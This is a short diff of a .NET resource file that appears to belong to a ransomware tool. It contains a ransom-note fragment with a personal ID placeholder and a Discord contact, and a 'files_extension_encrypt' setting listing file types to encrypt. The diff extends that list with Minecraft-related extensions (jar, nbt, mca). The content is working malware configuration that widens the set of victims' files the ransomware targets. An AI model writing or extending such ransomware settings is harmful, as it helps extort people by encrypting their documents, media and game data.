@@ -137,7 +137,7 @@ discord.gg/
 Personal ID: {personal_id}</value>
   </data>
   <data name="files_extension_encrypt.DefaultText" xml:space="preserve">
-    <value>txt,rar,zip,,dot,doc,wbk,docx,docm,dotx,dotm,docb,pdf,wll,wwl,xls,xlt,xlm,xll,xla,xla5,xla8,xlsx,xlsm,xltm,xlsb,xla,xlam,xll,xlw,ppt,pot,pps,ppa,ppam,pptx,pptm,potx,potm,ppam,ppsx,ppsm,sldx,sldm,pa,accda,accdb,accde,accdt,accdr,accdu,mda,mde,ecf,pub,xps,jpeg,png,gif,tiff,psd,eps,raw,jpg,ps,prn,bmp,pcx,rle,dib,html,odt,odp,ods,odg,odf,sxw,sxi,sxc,sxd,stw,ai,indd,u3d,prc,dwg,dwt,dxf,dwf,dst,xps,mpp,vsd,htm,js,css,jpf,jpx,jp2,j2k,j2c,jpc,xml,mov,mp4,m4v,3gp,3g3,mp3,flv,f4v,swf,avi,mpeg,mpg,wmv,asf,ram,wav,aif,aiff,mpa,m4a,wma,3dxml,sat,sab,cpp,c,cs,py,rs,php,json,obj,ico</value>
+    <value>txt,rar,zip,,dot,doc,wbk,docx,docm,dotx,dotm,docb,pdf,wll,wwl,xls,xlt,xlm,xll,xla,xla5,xla8,xlsx,xlsm,xltm,xlsb,xla,xlam,xll,xlw,ppt,pot,pps,ppa,ppam,pptx,pptm,potx,potm,ppam,ppsx,ppsm,sldx,sldm,pa,accda,accdb,accde,accdt,accdr,accdu,mda,mde,ecf,pub,xps,jpeg,png,gif,tiff,psd,eps,raw,jpg,ps,prn,bmp,pcx,rle,dib,html,odt,odp,ods,odg,odf,sxw,sxi,sxc,sxd,stw,ai,indd,u3d,prc,dwg,dwt,dxf,dwf,dst,xps,mpp,vsd,htm,js,css,jpf,jpx,jp2,j2k,j2c,jpc,xml,mov,mp4,m4v,3gp,3g3,mp3,flv,f4v,swf,avi,mpeg,mpg,wmv,asf,ram,wav,aif,aiff,mpa,m4a,wma,3dxml,sat,sab,cpp,c,cs,py,rs,php,json,obj,ico,jar,nbt,mca</value>
   </data>
   <metadata name="guna2BorderlessForm2.TrayLocation" type="System.Drawing.Point, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a">
     <value>199, 22</value>
